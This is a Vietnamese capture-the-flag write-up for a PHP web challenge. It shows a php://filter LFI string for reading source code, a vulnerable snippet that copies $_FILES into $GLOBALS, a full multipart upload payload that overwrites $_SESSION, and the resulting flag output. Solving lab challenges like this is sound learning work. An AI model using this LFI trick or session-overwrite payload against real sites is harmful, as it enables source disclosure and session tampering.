# Opening
Bài này không hề khó nhưng mọi người phải tinh ý 1 chút.

# Step 1: GET SOURCE
Đầu tiên lấy source của các trang home, upload, GiFt2 bằng LFI kết hợp với php wrapper:
php://filter/convert.base64-encode/resource=xxx

# Step 2: Know the vul
Ban đầu mình nghĩ chắc bài này là upload insecure file tuy nhiên đọc code lại không hề thấy lỗ nào để mà đục. Đọc kỹ hơn nữa mình nhân ra có một đoạn code rất vô lý nằm trong hàm `Upload_Single_File`.
```global $target_file;
	foreach ($_FILES as $key => $value)
	{
		$GLOBALS[$key] = $value;
	}
  ```
Đoạn này dùng để gán giá trị của một phần tử của biến $GLOBAL mà theo đúng cách hoạt động của nó sẽ là `$GLOBAL['filename']='xxx.png'`. Tuy nhiên ở đây giá trị đầu vào không hề được kiểm soát nên ta có thể thay đổi giá trị của những phần tử sẵn có bên trong biến $GLOBAL đặc biệt trong đó có $_SESSION. Thêm nữa tại home.php có đoạn gán session như sau `><?php $_SESSION['name']="children";?>`. Cộng thêm việc đọc hiểu mô tả của đề thì mình chắc chắn giá trị này phải đổi thành Nicolaus

# Step 3: Exploit
Nhớ đoạn code vô lý chứ nó nằm trước đoạn kiểm tra upload file nên dù có upload file thành công hay không cũng không quan trọng. so let's begin:
Để thay đổi được giá trị bên trong $_SESSION thì chúng ta cần một đoạn như này `$GLOBAL['_SESSION']='abcxyz'` vậy nên payload se trông như sau:
```
-----------------------------180251837238646225392010562464
Content-Disposition: form-data; name="target_file"; filename="123"
Content-Type: text/plain

123
-----------------------------180251837238646225392010562464
Content-Disposition: form-data; name="_SESSION"; filename="Nikolaus"
Content-Type: text/plain

xxx
-----------------------------180251837238646225392010562464
Content-Disposition: form-data; name="submit"

Upload
-----------------------------180251837238646225392010562464--
'''
```
và đây là kết quả: 
```
PS C:\Users\hentai> & python c:/Users/hentai/OneDrive/Desktop/CTF/PIS/noelv3/santa3.py
[+] Gift3:ChristCTF{merry_christmas_2020!!!h4d35w!7h10v3} 
PS C:\Users\hentai> 
```

# thank HADES với bài chốt khá là hay  shout-out for hades
